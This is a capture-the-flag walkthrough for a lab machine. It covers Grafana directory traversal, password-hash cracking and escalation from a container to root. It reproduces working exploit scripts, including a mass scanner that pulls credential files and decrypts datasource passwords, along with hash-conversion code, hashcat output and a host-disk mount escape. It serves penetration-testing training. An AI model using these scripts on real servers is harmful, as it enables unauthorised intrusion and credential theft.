
# Foothold

script from:
https://www.exploit-db.com/exploits/50581




```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import argparse
import sys
from random import choice

plugin_list = [
    "alertlist",
    "annolist",
    "barchart",
    "bargauge",
    "candlestick",
    "cloudwatch",
    "dashlist",
    "elasticsearch",
    "gauge",
    "geomap",
    "gettingstarted",
    "grafana-azure-monitor-datasource",
    "graph",
    "heatmap",
    "histogram",
    "influxdb",
    "jaeger",
    "logs",
    "loki",
    "mssql",
    "mysql",
    "news",
    "nodeGraph",
    "opentsdb",
    "piechart",
    "pluginlist",
    "postgres",
    "prometheus",
    "stackdriver",
    "stat",
    "state-timeline",
    "status-histor",
    "table",
    "table-old",
    "tempo",
    "testdata",
    "text",
    "timeseries",
    "welcome",
    "zipkin"
]

def exploit(args):
    s = requests.Session()
    headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.' }

    while True:
        file_to_read = input('Read file > ')

        try:
            url = args.host + '/public/plugins/' + choice(plugin_list) + '/../../../../../../../../../../../../..' + file_to_read
            req = requests.Request(method='GET', url=url, headers=headers)
            prep = req.prepare()
            prep.url = url
            r = s.send(prep, verify=False, timeout=3)

            if 'Plugin file not found' in r.text:
                print('[-] File not found\n')
            else:
                if r.status_code == 200:
                    print(r.text)
                else:
                    print('[-] Something went wrong.')
                    return
        except requests.exceptions.ConnectTimeout:
            print('[-] Request timed out. Please check your host settings.\n')
            return
        except Exception:
            pass

def main():
    parser = argparse.ArgumentParser(description="Grafana V8.0.0-beta1 - 8.3.0 - Directory Traversal and Arbitrary File Read")
    parser.add_argument('-H',dest='host',required=True, help="Target host")
    args = parser.parse_args()

    try:
        exploit(args)
    except KeyboardInterrupt:
        return


if __name__ == '__main__':
    main()
    sys.exit(0)
                       
```



```
python3 hej.py -H http://10.10.97.142:3000
Read file > /etc/passwd
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin

```


![image](https://github.com/suljov/CTF-Walkthroughs/blob/main/vulnlab/Data/Screenshots/Pasted%20image%2020240208191030.png)




# extra script


```
import os
import re
import json
import requests
import urllib3
import sqlite3
import base64

from PyInquirer import prompt
from termcolor import colored

from utils import LOGO
from secure import decrypt

# Disable SSL warnings
urllib3.disable_warnings()

HEADERS = {
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
}

if __name__ == "__main__":
    # Show logo
    print(colored(LOGO, 'red'))

    # Prompt the questions
    questions = prompt([
        {
            'type': 'input',
            'name': 'target_list',
            'message': 'Enter the target list:',
        }
    ])

    # Open domain list file
    try: domains = open(questions['target_list'], 'r', encoding='utf-8').readlines()
    except: raise Exception('[!] Domains file not exists.')

    # Open paths and payload list file
    payloads = open('payload.txt', 'r', encoding='utf-8').readlines()
    paths = open('paths.txt', 'r', encoding='utf-8').readlines()

    for domain in domains:
        vuln_payload = None

        domain = domain.strip()
        out_path = re.sub(r"[^0-9a-zA-Z]+", "_", domain)
        domain = domain if re.search(r"^https?:\/\/", domain) else "http://" + domain

        print(f'\n{"=" * 40}\n')

        print(colored(f"[i] Target: {domain}\n", "blue"))

        for payload in payloads:
            url = f"{domain}/public/plugins/{payload.strip()}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"

            req = requests.get(url, headers=HEADERS, timeout=(3, 10), allow_redirects=False, verify=False)

            if req.status_code == 200:
                print(colored(f"[!] Payload \"{url.strip()}\" works.\n", "green"))
                vuln_payload = payload.strip() # Set as vulnerable
                break # Stop payload tests
            else:
                print(colored(f"[!] Payload \"{url.strip()}\" not works.\n", "red"))

        if vuln_payload is not None:
            print(colored(f"[i] Analysing files...\n", "blue"))

            found = {}

            for path in paths:
                path = path.strip()

                url = f"{domain}/public/plugins/{vuln_payload}{path}"

                req = requests.get(url, headers=HEADERS, timeout=(3, 10), allow_redirects=False, verify=False)

                if req.status_code == 200:
                    print(colored(f"[i] File \"/{path.split('%2f')[-1]}\" found in server.", "yellow"))

                    out_file = os.path.join('.', out_path, path.split('/')[-1])

                    found[(path.split('/')[-1])] = out_file

                    if not os.path.isdir(f'./{out_path}'):
                        os.mkdir(f'./{out_path}')

                    with open(out_file, 'wb+') as fd:
                        fd.write(req.content)

                    print(colored(f"[*] File saved in \"{out_file}\".\n", "green"))

            if "grafana.db" in found.keys():
                eq = prompt([
                    {
                        'type': 'confirm',
                        'name': 'extract',
                        'message': 'Do you want to try to extract the passwords from the data source?',
                    }
                ])

                if eq['extract']:
                    # Default secret key
                    secret_key = "SW2YcwTIb9zpOOhoPsMm"

                    if "defaults.ini" in found.keys():
                        extracted_file = open(found["defaults.ini"], 'r').read()
                        extract_secret = re.search(r"^secret_key = (.*)$", extracted_file, flags=re.M)

                        if extract_secret:
                            secret_key = extract_secret.group(1)

                    if "grafana.ini" in found.keys():
                        extracted_file = open(found["defaults.ini"], 'r').read()
                        extract_secret = re.search(r"^secret_key = (.*)$", extracted_file, flags=re.M)

                        if extract_secret:
                            secret_key = extract_secret.group(1)

                    print(colored(f"\n[i] Secret Key: {secret_key}\n", "yellow"))

                    try: 
                        conn = sqlite3.connect(found["grafana.db"])
                    except:
                        print(colored(f"[!] Database corrupted or encrypted.", "red"))
                        exit(0)

                    cursor = conn.cursor()
                    items = [
                        json.loads(v[0]) for v in 
                        cursor.execute("SELECT secure_json_data FROM data_source").fetchall()
                    ]

                    for item in items:
                        if "password" in item:
                            ciphertext = item['password']
                            print(colored(f"[*] Decrypting password: {ciphertext}", "blue"))

                            encrypted = base64.b64decode(ciphertext.encode())
                            try:
                                pwdBytes, _ = decrypt(encrypted, secret_key)
                            except:
                                pwdBytes = None

                            if pwdBytes is None:
                                print(colored(f"[!] Unable to decrypt password..\n", "red"))
                            else:
                                print(colored(f"[*] Decrypted password: {pwdBytes}\n", "green"))
                                
        print(colored(f"[*] Bye Bye!", "red"))

```


```
python3 exploit.py --help
  _____   _____   ___ __ ___ _     _ _ ________ ___ ___ 
 / __\ \ / / __|_|_  )  \_  ) |___| | |__ /__  / _ ( _ )
| (__ \ V /| _|___/ / () / /| |___|_  _|_ \ / /\_, / _ \
 \___| \_/ |___| /___\__/___|_|     |_|___//_/  /_/\___/
                @pedrohavay / @acassio22

? Enter the target list:  targets.txt

========================================

[i] Target: http://data.vl:3000

[!] Payload "http://data.vl:3000/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd" works.

[i] Analysing files...

[i] File "/conf/defaults.ini" found in server.
[*] File saved in "./http_data_vl_3000/defaults.ini".

[i] File "/etc/grafana/grafana.ini" found in server.
[*] File saved in "./http_data_vl_3000/grafana.ini".

[i] File "/etc/passwd" found in server.
[*] File saved in "./http_data_vl_3000/passwd".

[i] File "/var/lib/grafana/grafana.db" found in server.
[*] File saved in "./http_data_vl_3000/grafana.db".

[i] File "/proc/self/cmdline" found in server.
[*] File saved in "./http_data_vl_3000/cmdline".

? Do you want to try to extract the passwords from the data source?  Yes

[i] Secret Key: SW2YcwTIb9zpOOhoPsMm

[*] Bye Bye!
```



![image](https://github.com/suljov/CTF-Walkthroughs/blob/main/vulnlab/Data/Screenshots/Pasted%20image%2020240208193502.png)



after the "Directory Traversal and Arbitrary File Read"
a sql file was found with users and passwords 

![image](https://github.com/suljov/CTF-Walkthroughs/blob/main/vulnlab/Data/Screenshots/Pasted%20image%2020240208193918.png)

users: 

```
admin
boris
```

password hash:
```
7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8

dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8
```


salt:
```
YObSoLj55S
LCBhdtJWjl
```



crack hash:
```
package main

import (
	"database/sql"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"os"

	_ "github.com/mattn/go-sqlite3"
)

func main() {
	// Open your SQLite database file
	db, err := sql.Open("sqlite3", "/path/to/your/db/file.db")
	if err != nil {
		panic(err)
	}
	defer db.Close()

	// Create/open the file to write hashed passwords and salts
	hashFile, err := os.Create("hashed_passwords.txt")
	if err != nil {
		panic(err)
	}
	defer hashFile.Close()

	// Execute the query to fetch user data
	rows, err := db.Query("SELECT email, password, salt, is_admin FROM user")
	if err != nil {
		panic(err)
	}
	defer rows.Close()

	// Iterate over the query results
	for rows.Next() {
		var email string
		var password string
		var salt string
		var isAdmin bool // Assuming is_admin is boolean, adjust if it's a different type
		err = rows.Scan(&email, &password, &salt, &isAdmin)
		if err != nil {
			panic(err)
		}

		// Decode password hash and salt
		decodedHash, _ := hex.DecodeString(password)
		hash64 := base64.StdEncoding.EncodeToString(decodedHash)
		salt64 := base64.StdEncoding.EncodeToString([]byte(salt))

		// Write hashed password and salt to file
		_, err = hashFile.WriteString("sha256:10000:" + salt64 + ":" + hash64 + "\n")
		if err != nil {
			panic(err)
		}
	}

	// Check for errors during iteration
	err = rows.Err()
	if err != nil {
		panic(err)
	}

	fmt.Println("Hashed passwords and salts have been written to hashed_passwords.txt")
}

```

```
go run wtf.go
Hashed passwords and salts have been written to hashed_passwords.txt
                                                                                                                                                                                                                                             


cat hashed_passwords.txt 
sha256:10000:WU9iU29MajU1Uw==:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMizzcjySFkthcunnP696TCBy+Pg=
sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=

```


![image](https://github.com/suljov/CTF-Walkthroughs/blob/main/vulnlab/Data/Screenshots/Pasted%20image%2020240208220522.png)


```
$ hashcat -a 0 hashed_passwords.txt /usr/share/wordlists/rockyou.txt -O  
hashcat (v6.2.6) starting in autodetect mode

<SNIP>
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921342
* Keyspace..: 14344385

sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:beautiful1
Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.
<SNIP>
```


![image](https://github.com/suljov/CTF-Walkthroughs/blob/main/vulnlab/Data/Screenshots/Pasted%20image%2020240208220604.png)



no we have shell


![image](https://github.com/suljov/CTF-Walkthroughs/blob/main/vulnlab/Data/Screenshots/Pasted%20image%2020240208220800.png)



# PrivEsc






```
boris@ip-10-10-10-11:~$ sudo -l
Matching Defaults entries for boris on ip-10-10-10-11:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User boris may run the following commands on ip-10-10-10-11:
    (root) NOPASSWD: /snap/bin/docker exec *
```

![image](https://github.com/suljov/CTF-Walkthroughs/blob/main/vulnlab/Data/Screenshots/Pasted%20image%2020240208225740.png)


after enumerating and finding the docker container name
linpeash
```
<SNIP>
root      1637  0.0  0.8 712860  8096 ?        Sl   20:11   0:02 /snap/docker/1125/bin/containerd-shim-runc-v2 -namespace moby -id e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 -address /run/snap.docker/containerd/containerd.sock
<SNIP>
```

we can get to root on that container and mount the host drive to be able to get root

![image](https://github.com/suljov/CTF-Walkthroughs/blob/main/vulnlab/Data/Screenshots/Pasted%20image%2020240208230031.png)


```
/usr/share/grafana # mkdir -p /mnt/suljov

/usr/share/grafana # mount /dev/xvda1 /mnt/suljov
```


![image](https://github.com/suljov/CTF-Walkthroughs/blob/main/vulnlab/Data/Screenshots/Pasted%20image%2020240208230129.png)

now can just go right in


``` 
/usr/share/grafana # cd /m
media/  mnt/
/usr/share/grafana # cd /mnt/suljov/
/mnt/suljov # cd root
/mnt/suljov/root # cat root.txt 
VL{37c930a3b8b53457d080b0a6f033bc16}
/mnt/suljov/root # whoami
root
/mnt/suljov/root # ip add
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```


![image](https://github.com/suljov/CTF-Walkthroughs/blob/main/vulnlab/Data/Screenshots/Pasted%20image%2020240208230208.png)



